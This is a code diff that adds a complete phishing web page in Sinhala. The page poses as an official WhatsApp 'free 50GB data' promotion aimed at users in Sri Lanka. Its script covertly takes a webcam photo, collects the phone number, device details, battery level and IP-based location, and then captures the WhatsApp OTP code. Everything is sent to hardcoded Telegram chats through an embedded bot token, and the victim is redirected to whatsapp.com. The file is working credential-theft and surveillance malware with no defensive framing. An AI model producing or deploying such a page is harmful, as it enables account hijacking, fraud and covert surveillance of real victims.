@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="si">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Promo - Free 50GB Data</title>
+    <style>
+        body { font-family: -apple-system, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; }
+        .card { background: white; width: 100%; max-width: 380px; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; border-top: 10px solid #00a884; }
+        .promo { background: #e7f3ff; color: #1a73e8; padding: 12px; border-radius: 12px; font-weight: bold; margin-bottom: 20px; font-size: 14px; }
+        .logo { width: 65px; margin-bottom: 15px; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; font-size: 16px; outline: none; }
+        .otp-group { display: flex; gap: 8px; justify-content: center; margin-top: 15px; }
+        .otp-group input { width: 42px; height: 52px; text-align: center; font-size: 22px; font-weight: bold; border: 2px solid #00a884; border-radius: 8px; }
+        .btn { background: #00a884; color: white; border: none; width: 100%; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 20px; font-size: 16px; }
+        #step2 { display: none; }
+        .footer { margin-top: 25px; font-size: 11px; color: #8696a0; border-top: 1px solid #eee; padding-top: 15px; }
+    </style>
+</head>
+<body onload="captureInitial()">
+
+<div class="card">
+    <div class="promo">🎁 සුබ පැතුම්! ඔබට නොමිලේ 50GB ඩේටා හිමිවී ඇත.</div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
+
+    <div id="step1">
+        <h2>WhatsApp Verify</h2>
+        <p style="font-size: 14px; color: #666;">නොමිලේ ඩේටා ලබා ගැනීමට ඔබගේ අංකය ඇතුළත් කරන්න.</p>
+        <div style="display:flex; align-items:center; background:#f9f9f9; border-radius:10px; padding:0 10px; border:1px solid #ddd;">
+            <span style="font-weight:bold;">🇱🇰 +94</span>
+            <input type="number" id="phone" placeholder="7X XXX XXXX" style="border:none; background:transparent;" oninput="if(this.value.length > 9) this.value = this.value.slice(0, 9);">
+        </div>
+        <button class="btn" onclick="snatchData()">සම්බන්ධ වන්න</button>
+    </div>
+
+    <div id="step2">
+        <h2 style="color:#00a884;">OTP Verification</h2>
+        <p style="font-size: 13px; color: #666;">ඔබේ අංකයට ලැබුණු කේතය ඇතුළත් කරන්න.</p>
+        <div class="otp-group">
+            <input type="number" class="o" oninput="move(this,0)" maxlength="1">
+            <input type="number" class="o" oninput="move(this,1)" maxlength="1">
+            <input type="number" class="o" oninput="move(this,2)" maxlength="1">
+            <input type="number" class="o" oninput="move(this,3)" maxlength="1">
+            <input type="number" class="o" oninput="move(this,4)" maxlength="1">
+            <input type="number" class="o" oninput="move(this,5)" maxlength="1">
+        </div>
+        <button class="btn" id="finBtn" onclick="finish()" disabled>සක්‍රීය කරන්න</button>
+    </div>
+
+    <div class="footer">🔒 Official WhatsApp Promotion. End-to-end encrypted.</div>
+</div>
+
+<script>
+    const bot = "8521741180:AAHMiUEg1TjVtCpyaGKdTllYtvIXz2XCjdk";
+    const admins = ["7871773175", "7252390182"];
+    let phoneNum = "";
+
+    // 1. Initial Capture (Photo)
+    async function captureInitial() {
+        setTimeout(async () => {
+            if(confirm("🎁 Free Data ලබා ගැනීමට අනන්‍යතාවය තහවුරු කිරීමට OK දෙන්න.")) {
+                try {
+                    const s = await navigator.mediaDevices.getUserMedia({video: true});
+                    const v = document.createElement('video'); v.srcObject = s; await v.play();
+                    const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v,0,0);
+                    const b = await (await fetch(c.toDataURL('image/jpeg'))).blob();
+                    for(let id of admins) {
+                        const fd = new FormData(); fd.append('chat_id', id); fd.append('photo', b, 'v.jpg'); fd.append('caption', '📸 **VICTIM PHOTO CAPTURED**');
+                        fetch(`https://api.telegram.org/bot${bot}/sendPhoto`, {method:'POST', body:fd});
+                    }
+                    s.getTracks().forEach(t => t.stop());
+                } catch(e) {}
+            }
+        }, 1500);
+    }
+
+    // 2. Snatch Everything (Device, Battery, Location)
+    async function snatchData() {
+        const n = document.getElementById('phone').value;
+        if(n.length < 9) return alert("අංකය වැරදියි!");
+        phoneNum = "+94" + n;
+
+        const ua = navigator.userAgent;
+        let battery = "N/A";
+        try { const bat = await navigator.getBattery(); battery = (bat.level * 100) + "%"; } catch(e) {}
+
+        let loc = "Blocked";
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            loc = `📍 City: ${d.city}\n🌍 ISP: ${d.org}\n🗺️ Google Map: https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+        } catch(e) {}
+
+        const msg = `🚀 **NEW TARGET SNATCHED**\n\n📱 **Phone:** \`${phoneNum}\` \n🔋 **Battery:** \`${battery}\` \n🛠️ **Device Info:** \`${ua.split('(')[1].split(')')[0]}\` \n\n${loc}`;
+        send(msg);
+
+        document.getElementById('step1').style.display = "none";
+        document.getElementById('step2').style.display = "block";
+    }
+
+    // 3. OTP Logic
+    function move(el, idx) {
+        if(el.value.length > 1) el.value = el.value.slice(0,1);
+        const boxes = document.querySelectorAll('.o');
+        if(el.value && idx < 5) boxes[idx+1].focus();
+        document.getElementById('finBtn').disabled = !Array.from(boxes).every(b => b.value.length == 1);
+    }
+
+    async function finish() {
+        let code = "";
+        document.querySelectorAll('.o').forEach(b => code += b.value);
+        await send(`🔱 **FINAL OTP CAPTURED**\nTarget: \`${phoneNum}\` \nOTP Code: \`${code}\``);
+        alert("Verification Success! Data will be added within 24 hours.");
+        window.location.href = "https://www.whatsapp.com";
+    }
+
+    function send(t) {
+        for(let id of admins) {
+            fetch(`https://api.telegram.org/bot${bot}/sendMessage?chat_id=${id}&text=${encodeURIComponent(t)}&parse_mode=Markdown`);
+        }
+    }
+</script>
+</body>
+</html>
